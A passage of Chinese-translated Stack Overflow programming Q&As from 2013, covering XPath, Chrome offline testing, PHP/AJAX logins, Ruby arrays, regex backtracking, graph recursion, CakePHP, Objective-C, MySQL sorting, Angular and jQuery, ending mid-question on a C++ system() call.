    </dependencies>
  </dependencyManagement>
</project> 
```

请注意，其他路径如`dependencyManagement/dependencies/dependency/groupId`不包括在内。

在 SO 上搜索时，我遇到了[`xmllint --xpath`](https://stackoverflow.com/questions/91791/grep-and-sed-equivalent-for-xml-command-line-processing/14492020?noredirect=1#comment22971123_14492020)xmlstarlet [，](/questions/tagged/xmlstarlet "显示标记为“xmlstarlet”的问题")但我对 xpath 的了解不够，无法自己解决。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-08T18:56:23.837

我最终使用了[xml2](http://www.ofb.net/~egnor/xml2)的 cygwin 构建：

```
xml2 <  pom.xml | grep -e "/project/parent/groupId" -e "/project/groupId"
/project/parent/groupId=...
/project/groupId=.... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-21T13:20:32.697

试试这个不带行号的 XPath 2.0 兼容查询，它检查所有查询路径中是否有匹配的`<groupID/>`元素并打印它们的文档名称，构造一个（不一定是唯一的）路径并添加元素的内容。

```
(//project/parent | //project)/groupId/string-join(
  (
    base-uri(),
    string-join(('', .//ancestor-or-self::*/name()), '/'),
    data(.)
  ), ':') 
```

例如，您可以使用[BaseX 集合](http://docs.basex.org/wiki/Commands#CREATE_DB)运行它（就像我为测试所做的那样），其中包含您要查询的所有 XML 文件。

1.  运行此命令以创建集合： `CREATE DB xmldocs /path/to/xml-files`
2.  使用上面的 XPath 查询数据库

有不同的方法可以运行查询，请查看[Standalone Mode 手册](http://docs.basex.org/wiki/Standalone_Mode)。

该查询还应该在其他与 XPath 2.0 兼容的引擎中运行，例如 saxon（它也将支持行号，请参阅我上面的评论）。

# google-chrome - Chrome 是否有“离线工作”选项？

> ID：16091243
> 
> 赞同：73
> 
> 时间：2013-04-18T19:12:16.547
> 
> 标签：google-chrome, offline-browsing

我正在尝试在我的 html5 缓存清单中测试我的后备页面。我宁愿不必为了做到这一点而真正断开与互联网的连接。我听说它在 Chrome 中不太正常，所以我需要专门对其进行测试。Chrome 是否可以离线工作？我搜索了设置和可用的扩展程序，但找不到任何东西。

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2015-03-29T05:38:36.290

看起来 Chrome 现在通过 Chrome 开发人员工具 (Ctrl-Shift-I) 具有此功能。单击左上角的“设备模式”图标。现在，可以使用屏幕顶部的下拉菜单来模拟设备和网络带宽和延迟（或完全离线）：

![设备和网络选择](https://i.stack.imgur.com/8LwtD.png)

上面的屏幕截图来自 Linux 上的 Chrome 版本 42.0.2311.60 beta（64 位）。

**注意**：不幸的是，截至 2015 年 4 月，这不会影响 Websocket 连接，无论网络设置如何，这些连接都会继续运行。请参阅[https://code.google.com/p/chromium/issues/detail?id=423246](https://code.google.com/p/chromium/issues/detail?id=423246)。

**2021 年 9 月更新**：从 Chrome 96 开始，网络设置似乎最终会影响 websocket 连接。有关详细信息，请参阅上面的问题。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2013-04-18T19:26:58.003

Chrome 有一个名为“启用显示保存的副本按钮”的标志。
通过访问 URL 找到标志`chrome://flags/#show-saved-copy`

> **启用显示保存的副本按钮**
> 当页面加载失败时，如果浏览器缓存中存在页面的陈旧副本，则会显示一个按钮以允许用户加载该陈旧副本。主要启用选项将按钮置于错误页面上最显着的位置；次要启用选项将其置于重新加载按钮的次要位置。

请注意，此标志过去称为“启用离线加载陈旧按钮”。

![Chrome 离线示例](https://i.stack.imgur.com/QHAaE.png)

Gmail 还有一个离线选项。[Gmail Offline](https://support.google.com/mail/answer/1306849?hl=en)是一款 Google Chrome 应用程序，可让您在没有互联网连接时阅读和管理邮件。您甚至可以编写将在您重新联机时发送的消息。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-12-09T14:11:10.540

谷歌浏览器本身没有这个功能，但是，我发现这个页面正是通过扩展来做到这一点的。

[http://techlogon.com/2013/01/25/how-to-work-offline-in-google-chrome/](http://techlogon.com/2013/01/25/how-to-work-offline-in-google-chrome/)

它通过将 chrome 流量路由到您指定的没有代理的代理来工作，因此不会接收任何网络流量。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-01-10T02:03:02.037

[离线切换器](https://chrome.google.com/webstore/detail/offline-switcher/klpkdojcmgnmoikmlacpnjkmjlfhgeje)是一个新的方便的 Chrome 扩展，可以快速完成这项工作。您可以在离线和在线模式之间切换。

[![Chrome 离线切换器](https://i.stack.imgur.com/P9xRC.png)](https://i.stack.imgur.com/P9xRC.png)

插件很简单，只需将 Chrome 代理设置为不存在的点。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-18T19:17:22.027

据我所知，谷歌浏览器没有离线工作选项，所以断开互联网是我能想到的唯一方法。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-10-06T04:12:49.880

这里有一些相关的铬错误

Devtools 功能请求：使用键盘快捷键切换网络限制配置文件[https://code.google.com/p/chromium/issues/detail?id=511152](https://code.google.com/p/chromium/issues/detail?id=511152)

DevTools：在设备仿真中未触发在线/离线事件 [https://code.google.com/p/chromium/issues/detail?id=422956](https://code.google.com/p/chromium/issues/detail?id=422956)

如果您使用的是 Firefox，Work Offline 扩展非常方便 [https://addons.mozilla.org/en-GB/firefox/addon/work-offline/](https://addons.mozilla.org/en-GB/firefox/addon/work-offline/)

# php - 通过 javascript 从服务器端显示错误消息

> ID：16091244
> 
> 赞同：0
> 
> 时间：2013-04-18T19:12:19.193
> 
> 标签：php, javascript, html, mysql, ajax

我总共有3个文件。login.html - login.js - login.php

```
function login(){
    $(document).ready(function(){
        var epost = document.getElementById("epost").value;
        var passord = document.getElementById("passord").value;
        $.ajax({
            type: 'POST',
            url: 'login.php',
            data: "epost=" + epost + "&passord=" + passord,
            success: function(result){
            }
        });
    });
} 
```

这是PHP文件：

```
<?php

require 'db.php';
session_start();

if(!$_POST['epost'] || !$_POST['passord']){
    echo "Type in username and password";
}
else{
    $stmta = $dbo->prepare("SELECT * FROM kunde WHERE epost = ?");

    $stmta->execute(array($_POST['epost']));
    $login = $stmta->fetch();

    if(empty($login)){
        echo "User does not exist";
    }
    else {
        $passord_db = $login['passord'];    
        $passord = md5($_POST['passord']);      

        if($passord_db != $passord){            
            echo "Invalid password";
        }
        else{
            $active = $login['active'];     
            $epost = $login['epost'];       

            if($active == 0){
                echo "Activate your account ($epost) ";
            }
            else{
                $_SESSION['epost'] = $epost;
            }
        }
    }
}
?> 
```

这可能是一个愚蠢的问题，所以我提前道歉，但是这些错误消息如何通过 js-script 而不是 PHP-script 显示？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-18T19:14:44.037

在您的 javascript 中，您有一个`success`带有`function(result)`此变量的属性，该属性`result`将包含从 php 文件打印的任何输出。然后，您可以使用 javascript 在 html 中任何您喜欢的地方注入输出（错误消息）。

# ruby - 使用 Ruby 进行数组包含检查

> ID：16091248
> 
> 赞同：1
> 
> 时间：2013-04-18T19:12:41.777
> 
> 标签：ruby, arrays, include

我需要检查数组是否

```
a1 = [x, y] 
```

以数组数组的形式呈现，例如

```
a2 = [ [a, b], [c,d], [e, f] ] 
```

使用 Ruby 1.9。例如， if`x == c`和`y == d`then 函数必须是`True`. 我试过了

`a2.includes? a1`但`a1 in a2` 两者都不起作用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-18T19:18:10.160

看你用过**`includes?`**，应该是[**`include?`**](http://www.ruby-doc.org/core-1.9.3/Array.html#method-i-include-3F)。

```
a2 = [ [:a, :b], [:c,:d], [:e,:f] ]
a1 = [:a,:b] 
p a2.include? a1 #=>true 
```

或者你可以这样做：

```
a2 = [ [:a, :b], [:c,:d], [:e,:f] ]
a1 = [:a,:b] 
p a2.one? { |i| i == a1} #=>true 
```

# c# - 为什么带有 Regex 语句的 Linq Query 被锁定

> ID：16091252
> 
> 赞同：0
> 
> 时间：2013-04-18T19:12:57.800
> 
> 标签：c#, regex

我正在尝试在 fileSytem 和 Ftp 研究中使用 Regex 对象机器人过滤搜索。如果我在 Ftp 上运行此代码段，它可以工作，但如果我在本地 FileSystem 上运行它，它不会响应：

在 FTP 上

```
string[] filesArray = ftp.ListDirectory(@"/" + SrcPath + @"/").Where(fileName => Regex.IsMatch(fileName, /*@"^[a-zA-Z0-9\-]*?$"*/"(.*)"+ SrcMask, RegexOptions.IgnoreCase)).ToArray(); 
```

在本地文件系统上

```
 String[] files = Directory.GetFiles(SrcPath).Where(fileName => Regex.IsMatch(fileName, "(.*)" + *.pdf, RegexOptions.IgnoreCase)).ToArray() 
```

对 foreach 做同样的事情，我注意到当它遇到“none pdf”文件时，在 if 条件下，语句被锁定：

```
string input = "*.pdf";
Regex regx = new Regex("(.*)"+input); 
String[] filesName = Directory.GetFiles("c:\\temp\\").Select(fileName => new FileInfo(fileName).FullName).ToArray();
foreach(String s  in filesName)
{
    if (regx.IsMatch(s))
    {
        File.Copy(s, "C:\\temp\\files\\"+s.Split('\\').Last(), true);
        count++; 
    }
    Console.WriteLine(count);              
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:23:59.537

简短的回答是

```
(.*)* 
```

当正则表达式无法匹配时，会导致回溯地狱。

摆脱不必要的 second `*`，或者最好只`\.pdf$`用于正则表达式。

# jquery - 在 jquery 令牌输入中创建令牌

> ID：16091254
> 
> 赞同：5
> 
> 时间：2013-04-18T19:13:00.273
> 
> 标签：jquery, ruby-on-rails, jquery-ui, jquery-tokeninput

目前我的 jquery 令牌输入工作得很好。

无法创建不在列表中的令牌

我在[这里](https://github.com/loopj/jquery-tokeninput/pull/219)看到，这个功能已经实现。但是没有关于我们如何使用它的文档。

任何人都可以帮助我提供文档或演示

js_js.js

```
 $(document).ready(function () {
        $("#job_skills").tokenInput("/jobs/search_job_skills", {
            theme: "facebook",
            preventDuplicates: true,
            hintText: 'Add skills need for job',
            searchingText: 'searching skills...',
            allowCreation: true,
            creationText: 'Add new element'
        });

    }); 
```

cons_controller.rb

```
 def search_job_skills
    search_for_json(Skill)
  end

  def search_for_json(model_search)
    @hash = []

    @search_res = model_search.where(['name LIKE ?', "#{params[:term]}%"])

    @search_res.each do |tag|
      @hash << { id: tag.id,
                 name: tag.name}
    end
    render json: @hash
  end 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-06-27T14:44:29.613

包括`allowFreeTagging: true`在您启动时。

不幸的是，文档在几年内没有更新。

另请注意，如果您设置`allowFreeTagging`为 true，您将需要将 更改`tokenValue`为`"name"`，因为当您在服务器上保存标签时，您可能希望保存名称，而不是 id。

这是我的令牌选项

```
tokenOptions = {
    allowFreeTagging: true,
    tokenValue: 'name'
}

$('input#tag-input').tokenInput('/tags.json', tokenOptions); 
```

这样，当用户选择标签时，名称将发送到服务器，如果有任何新的标签名称，我只需在服务器端创建它们。

# java - 计算subgrah的重量

> ID：16091260
> 
> 赞同：0
> 
> 时间：2013-04-18T19:13:18.137
> 
> 标签：java, algorithm, graph-algorithm, jung

我需要寻求您的帮助，因为我已经为我的问题苦苦挣扎了很多天，但没有找到任何合适的解决方案。我想找到包含节点（将成为我的方法的参数）的 subgrah 的权重，并将以中心节点 0 结束。我知道这听起来很愚蠢，但图像在这里会有很大的帮助（[http://img542.imageshack。我们/img542/5400/zrzutekranu20130418o205.png](http://img542.imageshack.us/img542/5400/zrzutekranu20130418o205.png)）。例如 getWeight(8) 将返回 21，如果我们运行 getWeight(7) (9,10) 则相同。getWeight(2) = 7。我写了这样的方法，但有时我得到堆栈溢出异常:(

```
 private void getWeight(Object node, Object source) {
        Collection nodeCollection = graph.getNeighbors(node);
        for (Object n : nodeCollection) {
            if ((Integer) n == 0) {
                weight += ((MyEdge) (graph.findEdge(startNode, node))).getW();
            } else {
                if (n != source) {          
                    weight += ((MyEdge) (graph.findEdge(node, n))).getW();
                    getWeight(n, node);
                } else {
                }

            }
        }
       return weight;
    } 
```

我正在使用jung2 lib。

请帮忙，你是我最后的希望！

@Zim-Zam O'Pootertoot：像这样？

```
ArrayList<Boolean> visited = new ArrayList<Boolean>();
public void getWeight2(Object i) {
    visited.set((Integer) i, true);
    for (Object v : getGraph().getNeighbors(i)) {
        if (!visited.get((Integer) v)) {
            if (getGraph().getNeighborCount(v) > 1 & !v.equals(startNode)) {
                weight += ((MyEdge) getGraph().findEdge(i, v)).getW();
                getWeight2(v);
            } else {
                weight += ((MyEdge) getGraph().findEdge(i, v)).getW();

            }
        }
    }
} 
```

仍然是 SOExp ;(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:20:51.350

看起来你在重复计算节点。你可以创建一个`HashSet`你传入的`getWeight`包含你已经访问过的节点；循环将跳过集合中的`for`节点，并将 nodeCollection 与哈希集联合。

另一种选择是在您的节点中放置一个访问标志 - 将它们初始化为 false，并在您访问节点时将它们设置为 true。棘手的部分是在完成后将所有标志重置为 false - 为此，我建议您保留所有节点的单独列表，以便您可以遍历它以重置标志，而无需再次遍历您的图表.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T21:34:31.793

*我对jung*一无所知，但是这个伪 java 概述了一种方法来计算您正在寻找的权重，它保留了一个地图来追踪访问过的节点和访问过的边（以避免重新计算任何时候），您必须使用 api 等效方法填补空白并进行调整：

```
private int calculateWeight(Object startNode, HashMap<Node, Boolean> visitedNodes, HashMap<Edge, Boolean> visitedEdges) {
    int w = 0;
    if (!visitedNodes.get(startNode)) {
        // Don't know if this method (getEdeges) exists, but if you could implement 
        // a way to get all the edges that go out from a node, then paste the code  here 
        //
        // Get the edges from the node
        Collection edges = startNode.getEdges();

        for (Object edge : edges) { 
            // If the edge haven't been visited, then add its weight to w
            if (!visitedEdges.get(edge)) {
                w += edge.getW();
                // Mark the edge as visited 
                visitedEdges.put(edge, true);
            }
        }
        // We are done with this node, mark it as visited
        visitedNodes.put(startNode, true);

        // Check the neighbors of this node recursively 
        Collection neighborNodes = getGraph().getNeighbors(startNode);
        for (Object node : neighborNodes) {
            // Go recursively with this node, passing in the visited nodes and edges maps to avoid recounting
            w += calculateWeight(node, visitedNodes, visitedEdges);                
        }
    }
    return w;
}

// Then, use the above method like this 
public static void main(String... args) { 
    HashMap<Node, Boolean> visitedNodes = new HashMap<Node, Boolean>();
    HashMap<Edge, Boolean> visitedEdges = new HashMap<Edge, Boolean>();

    // Search the startNode and nodeZero from the graph...

    // Add the Node 0 to the visitedNodes map, so the zero node won't be processed 
    visitedNodes.put(nodeZero, true);

    int w = calculateWeight(startNode, visitedNodes, visitedEdges);
} 
```

**警告：**这只是一个伪java，我没有测试过

希望这有助于或至少给你一个提示来解决问题

# php - Cake PHP 分隔符不能是字母数字或反斜杠，带有自定义验证规则

> ID：16091261
> 
> 赞同：0
> 
> 时间：2013-04-18T19:13:18.390
> 
> 标签：php, cakephp, validation, cakephp-2.0

我有一个问题想告诉你。我已经在课堂帖子的 appmodel 中设置了自定义验证规则。

```
'DELIVERYAREA' => array(
        'rule-1' => array(
            'rule' => array('between', 5, 5),
            'message' => 'Bitte eine fünfstellige Postleitzahl eingeben'
        ),
        'rule-2' => array(
            'rule' => 'numeric',
            'message' => 'Bitte nur Zahlen eingeben'
        ),
        'rule-3' => array(
            'rule' => 'ZipExists',
            'message' => 'Postleitzahl existiert nicht!'            
        )
    ) 
```

函数 ZipExists 也在 appmodel 中编码，但在类 zipcode 中。

```
public function ZipExists($zipcode){
$valid = $this->find('count', array('conditions'=> array('Zipcode.zipcode' =>$zipcode)));
if ($valid >= 1){
  return true;
}
else{
  return false;
}
} 
```

debug($valid) 抛出正确的数字：如果函数找到有效的邮政编码，则为 1，否则为 0。这意味着该函数被正确调用。但是 Cake 所做的有两件事。首先它会抛出一个错误：分隔符不能是字母数字或反斜杠。自从尝试使用 array_push($zipcode); 在函数中不起作用我对此一无所知。

其次，Deliveryarea 视图中的错误消息一直显示，无论函数抛出 true 还是 false。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T08:13:00.283

我找到了解决方案。Cake 希望自定义验证规则位于调用该规则的特定类中。因此，当您在课堂帖子中调用自定义规则时，必须将自定义函数写在课堂帖子中，否则 cake 不会找到它并每次都将其验证为 false。

这里要做的魔术是在你调用验证函数的类中导入你想要使用的 appmodel-class。这适用于以下语句：

$Zipcode = ClassRegistry::init('Class to use - 在我的例子中是 "Zipcode"');

但是，如果您的表通过 hasAny 或 belongsTo 等相互关联，则自定义函数在没有这些的情况下也可以工作。您不能错过的另一个重要点是，所有验证功能都必须使用“公共功能 xyz”引入，否则蛋糕也找不到它们。

# objective-c - 如何通过跳过每 1 个索引来创建数组

> ID：16091263
> 
> 赞同：0
> 
> 时间：2013-04-18T19:13:23.807
> 
> 标签：objective-c, arrays

嗨，有没有一种方法可以通过跳过每个 1 索引来创建一个数组，比如可以说我有一个包含如下对象的数组：

```
NSArray *array =[NSArray alloc] initWithObjects:@"id",@"name",@"id",@"name",@"id",@"name".. 
```

...等等，我可以通过仅获取**ID**对象和/或**NAMES**来创建一个数组。我陷入了困境，我真正想要实现的是我希望 id 出现在 tableview 副标题中，并且名称出现在 tableview 标题中。有什么建议么？

**编辑：**谢谢大家的帮助，已经得到了我的答案，我无法通过 NSDictionary，因为我正在从 .php 获取对象。无论如何谢谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:20:33.577

你有两个选择

第一个（天真的）一个：

```
cell.subtitle.text = array[indexPath.row*2];
cell.title.text = array[indexPath.row*2+1]; 
```

`NSDictionary`无论如何，更正确的选择是使用s数组

```
NSArray *array = [NSArray alloc] initWithObjects:@{
    @"id": @"theId", @"name" : @"theName"},
    @"id": @"anotherId", @"name" : @"anotherName"},
    ...]; 
```

接着

```
cell.subtitle.text = array[indexPath.row][@"id"];
cell.title.text = array[indexPath.row][@"name"]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:21:11.807

您可以通过制作字典对象数组轻松实现。

```
NSArray *array = @[@{@"Id":1, @"Name":@"UserName1"},@"Id":2, @"Name":@"UserName2"}]; 
```

在`cellForRowAtIndexPath`: 方法中

```
NSDictionary *user = self.array[indexPath.row];

cell.textLabel.text = user[@"Id"];
cell.detailLabel.text = user[@"Name"]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:20:11.917

为什么不从一开始就使用 2 个数组？如果必须拆分数组，一种简单的方法是对偶数和奇数进行拆分。

```
NSArray *array =[[NSArray alloc] initWithObjects:@"id",@"name",@"id",@"name",@"id",@"name",nil];

NSArray *ids = [array objectsAtIndexes:[array indexesOfObjectsPassingTest:^BOOL(id obj, NSUInteger idx, BOOL *stop) {
    return ((idx % 2) == 0);
}]];

NSArray *names = [array objectsAtIndexes:[array indexesOfObjectsPassingTest:^BOOL(id obj, NSUInteger idx, BOOL *stop) {
    return ((idx % 2) != 0);
}]]; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-18T19:20:44.070

如果您想将 ids 和名称分隔在两个不同的数组中，您可以遍历原始数组，并像这样使用 mod 运算符。-

```
NSArray *array = [[NSArray alloc] initWithObjects:@"id",@"name",@"id",@"name",@"id",@"name", nil];
NSMutableArray *ids = [[NSMutableArray alloc] init];
NSMutableArray *names = [[NSMutableArray alloc] init];

for (int i = 0; i < array.count; i ++) {
    if (i % 2 == 0) {
        [ids addObject:[array objectAtIndex:i]];
    } else {
        [names addObject:[array objectAtIndex:i]];
    }
} 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-18T19:58:05.613

如果可以的话，许多答案只会建议使用其他一些推荐的数据结构。但是假设你有这样一个数组并且需要这样做并不难。您可以将数组处理为两个 - 可能需要大量复制；或者您可以简单地查看数组 - 它会在访问时间上花费一点点时间来进行复制。这里`JASArray` **绝对没有检查代码**（留给你）：

```
@interface JASArray : NSArray

- (id) initWith:(NSArray *)baseArray jumpTo:(NSUInteger)jumpTo strideBy:(NSUInteger)strideBy;

@end 
```

要覆盖`NSArray`您只需要实现`count`and `objectAtIndex:`：

```
@implementation JASArray
{
   NSUInteger jump;
   NSUInteger stride;
   NSArray *base;
}

- (id) initWith:(NSArray *)baseArray jumpTo:(NSUInteger)jumpTo strideBy:(NSUInteger)strideBy
{
   self = [super init];
   if (self)
   {
      base = baseArray;
      jump = jumpTo;
      stride = strideBy;
   }
   return self;
}

- (NSUInteger) count
{
   return 1 + (base.count - jump - 1) / stride;
}

- (id) objectAtIndex:(NSUInteger)index
{
   return [base objectAtIndex:(jump + index * stride)];
}

@end 
```

现在进行测试，请注意故意不匹配对作为测试：

```
NSArray *array =@[ @"id1", @"name1", @"id2", @"name2", @"id3", @"name3", @"id4" ];
JASArray *ids = [[JASArray alloc] initWith:array jumpTo:0 strideBy:2];
JASArray *names = [[JASArray alloc] initWith:array jumpTo:1 strideBy:2];
NSLog(@"%@\n%@\n%@", array, ids, names); 
```

输出：

```
JumpAndStride[10480:303] (
    id1,
    name1,
    id2,
    name2,
    id3,
    name3,
    id4
)
(
    id1,
    id2,
    id3,
    id4
)
(
    name1,
    name2,
    name3
) 
```

高温高压

# mysql - 使用 collat e 将 varchar 列排序为数字列

> ID：16091266
> 
> 赞同：0
> 
> 时间：2013-04-18T19:13:29.783
> 
> 标签：mysql, sorting, collate

我有一个具有 VARCHAR 列的 MySQL 表。该列仅包含数字，我希望能够对其进行数字排序，即 100、101、1001。目前它将它们排序为 100、1001、101 等。我听说我可以简单地更改表格以添加整理属性，所以它将按数字排序。当我键入“显示排序规则”时，我看不到任何似乎用于将 varchar 列视为数字列的排序规则类型。

所以我的问题是，我可以使用什么排序规则来对这个 varchar 列进行数字排序？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:18:46.460

如果该`varchar`列只包含数字，那么它应该是一个整数列。否则，你可以做

```
ORDER BY CAST(col AS SIGNED) 
```

[查看演示](http://sqlfiddle.com/#!2/19f9b/4)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:25:53.433

没有内置的排序规则可以将数值作为数字进行比较。

您可以开发自己的，但是，您将很难将其部署在共享主机和类似的东西上。

如果您可以不使用索引进行排序，您可以将其转换为整数：

```
SELECT  *
FROM    mytable
ORDER BY
        CASE field REGEXP '^-?[0-9]$' THEN CAST(field AS SIGNED INTEGER) END 
```

# wordpress - 如何检查错误页面当前是否显示在 WordPress 中？

> ID：16091272
> 
> 赞同：0
> 
> 时间：2013-04-18T19:13:57.517
> 
> 标签：wordpress

WordPress 具有条件函数，例如`is_front_page()`或 `is_home()`测试网站上当前加载的内容。

如果显示错误页面，是否有一些类似的功能可以测试？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:16:22.350

is_404() 函数？我想这就是你需要的。

[http://codex.wordpress.org/Function_Reference/is_404](http://codex.wordpress.org/Function_Reference/is_404)

# java - 将图像转换为矩阵

> ID：16091280
> 
> 赞同：0
> 
> 时间：2013-04-18T19:14:57.597
> 
> 标签：java, image, matrix

我正在尝试将简单图像转换为矩阵 M*N，其中 M 和 N 是图像的宽度和高度。但在这一点上，我不明白制定这些步骤的最佳方法。

此刻有我的代码：

```
 public double[][] img2matriz(BufferedImage bi){
    double[][] C;
    for(int i=0;i<bi.getHeight();i++) 
    {
        for(int j=0;j<bi.getWidth();j++)
        {
            C[i][j]
        }
    }     
} 
```

在 [i] 和 [j] 中，我想分别放置矩阵 RGB 的值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:16:21.250

尝试这个：

```
C[i][j] = bi.getRGB(i, j); 
```

该`getRGB()`方法返回一个整数，可以对其进行位掩码以提供各个组件。如果 C 是一个整数数组，而不是双精度数组，那会更合适。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:21:35.927

create a class :

```
 class RGB {
        private :
           float r;
           float g;
           float b;

            RGB(float rr , float gg , float bb) : r(rr) ,g(gg), b(bb){}
        public:
... member functions
    } 
```

and use it as array of object .

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:22:59.360

**First** : initialize your array Like this :

```
double[][] C = new double[bi.getHeight()][bi.getWidth()]; 
```

**Second** : get the `RGB` from your Image and put it in your array, Like this:

```
C[i][j] = bi.getRGB(i, j); 
```

and if you want to get the 3 channels in your image`(RED-GREEN-BLUE)` : You can do this :

```
int red = (C[i][j]>> 16) & 0x000000FF;
int green = (C[i][j]>>8 ) & 0x000000FF;
int blue = (C[i][j]) & 0x000000FF; 
```

# javascript - Angular.js $resource 数据处理

> ID：16091281
> 
> 赞同：0
> 
> 时间：2013-04-18T19:15:03.870
> 
> 标签：javascript, ajax, angularjs

我有一个服务器端 REST api，它可以返回具有任意结构的 jsonyfied 数据。在客户端，我有一个 Angular 应用程序。

资源定义：

```
module.factory('SearchQueries', function ($resource){          
   return $resource('/instances/searches/:_id', {_id: '@_id'}); 
}) 
```

在我尝试从我的 api 获取数据后：

```
$scope.search_queries = SearchQueries.query(null, function(args){  
  console.log('success: ', args);                                  
  for (i in args) {                                                
  }                                                                
}); 
```

客户端接收具有某种结构的数据：

`{"2": "serfgserg", "3": "sdfgdfg", "4": "sdgdfhdfghfgh", "5": "sdgdfhdfghfgh"}`

但！在 Angular 资源的成功函数中，数据的每个符号都是一个元素对象的值。

`[{"0":"s","1":"e","2":"r","3":"f","4":"g",`ETC

为什么要完成？如何预防或正确使用？

# 编辑：

如果我从服务器返回一个数组：

```
res = json.dumps(["sdf", "asdf", "asdf"])                             
return Response(response=res, mimetype='application/json',
        status=status) 
```

没关系，我有相同的结果：

```
[{"0":"s"},{"0":"d"},{"0":"f"},{"0":"a"},{"0":"s"},{"0":"d"},{"0":"f"} // e.t.c 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T22:30:24.220

这是因为`query`需要一个对象数组，而不是一个对象 - 请参阅[ngResource 文档](http://docs.angularjs.org/api/ngResource.%24resource)：

> '查询'：{方法：'GET'，isArray：true}

期望类似：

```
[{"name":"sdf"}, {"name":"asdf"}, {"name":"asd"}] 
```

# javascript - 无法从 $.post 返回数据以使用 jquery 显示？

> ID：16091283
> 
> 赞同：0
> 
> 时间：2013-04-18T19:15:14.777
> 
> 标签：javascript, jquery

我的 html 内容如下所示：

```
 <table>
                    <tr>
                          <th>Log1 Column</th>
                          <th>Log2 Column</th>
                          <th>Log3 Column</th>
                    </tr>
            <tbody id="bottomLogTable"></tbody>
            </table> 
```

不知何故，我没有从 #bottomLogTable 位置的 $.post 获取返回数据，但萤火虫说 200 ok，这意味着数据返回。

```
 $("#logClick").live("click", function()
        {
              $.post("node2542.txt", function(data)
              {
                    $("#bottomLogTable").append(data); // not display returned data
                    $("#bottomLogTable").html(data); // also not display returned data

              });
        }); 
```

有什么建议或想法可以让我朝着正确的方向解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:18:27.077

**编辑：**如果您有效地收到响应但仍然无法正常工作，则可能是跨域问题。您可以尝试将您的文本文件放在与您的页面完全相同的域中，看看它是否有效...

值得一提的是 Live 在 jQuery 的最新版本中已被弃用...

> 从 jQuery 1.7 开始，不推荐使用 .live() 方法。使用 .on() 附加事件处理程序
> 
> [http://api.jquery.com/live/](http://api.jquery.com/live/)

# javascript - 将 Qtip 保持在页面范围内？

> ID：16091288
> 
> 赞同：0
> 
> 时间：2013-04-18T19:15:31.493
> 
> 标签：javascript

我正在使用 QTip 作为侧边栏： ![在此处输入图像描述](https://i.stack.imgur.com/gXej0.png)

如您所见，QTip 稍微偏离屏幕并在我的屏幕上创建了一个丑陋的 hscrollbar。

这是代码：

```
function appendCalendarEventToList(className, event) {

    var eventObject = {
        title: event.title,
        id: event.id,
        type: event.type,
        color: event.color,
        description: event.description,
        canReoccur: event.canReoccur,
        reoccurVal: event.reoccurVal,
        estHours: event.estHours
    };

    var div = document.createElement("div");
    div.className = 'external-event';
    div.style.background = event.color;
    div.innerHTML = event.title;

    // store the Event Object in the DOM element so we can get to it later
    $(div).data('eventObject', eventObject);

    $(div).draggable({
        helper: function () {
            $copy = $(this).clone();
            $copy.data('eventObject', eventObject);
            $copy.css({ "list-style": "none", "width": $(this).outerWidth() }); return $copy;
        },
        appendTo: 'body',
        zIndex: 999,
        revert: true,      // will cause the event to go back to its
        revertDuration: 0  //  original position after the drag
    });

    $(className).append(div);

   $(div).qtip({
        content: event.title,

        position:
            {
                target: 'mouse'
            },
        //  show: { event: 'click' },
        hide: { event: 'mousedown mouseleave' },
        style: {
            width: 200,
            padding: 5,
            color: 'black',
            textAlign: 'left',
            border: {
                width: 1,
                radius: 3
            },

            classes: {
                tooltip: 'ui-widget',
                tip: 'ui-widget',
                title: 'ui-widget-header',
                content: 'ui-widget-content'
            }
        }
    });

    return div;
} 
```

现在，我想要的是，如果我可以将它保留在页面内（if（tip.right > page.right，tip.right = page.right））或其他东西..

有没有办法做到这一点？

至少，我想确保它永远不会导致 hscroll bar。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:35:48.530

我有三个愚蠢的答案...

1.  在 qtip 上使用`position:fixed`而不是。`position:absolute`
2.  使用`max-width`而不是`width`和定义`right:0`，这样 qtip 的右侧将永远不会超过身体的最右侧。
3.  试试我自己[制作](http://www.xpy.gr/tipy)的一个 jQuery 工具提示插件，（在这种情况下告诉我你的想法）。

# c++ - 我发现了一个新范式：系统

> ID：16091290
> 
> 赞同：-6
> 
> 时间：2013-04-18T19:15:40.557
> 
> 标签：c++

我目前正在学习如何处理命令行参数。我有一个程序需要调用另一个程序，都是用 C++ 编写的。我有一台 Windows 电脑。这是程序

```
#include "stdafx.h"
#include <iostream>
#include <sstream>

using namespace std;

void main()
{   
    char buffer[200];
    char arg1[6]="Hello";
    std::stringstream buffer;
    sprintf(buffer, "C:\system.exe %i %i", arg1);
    system(buffer);     

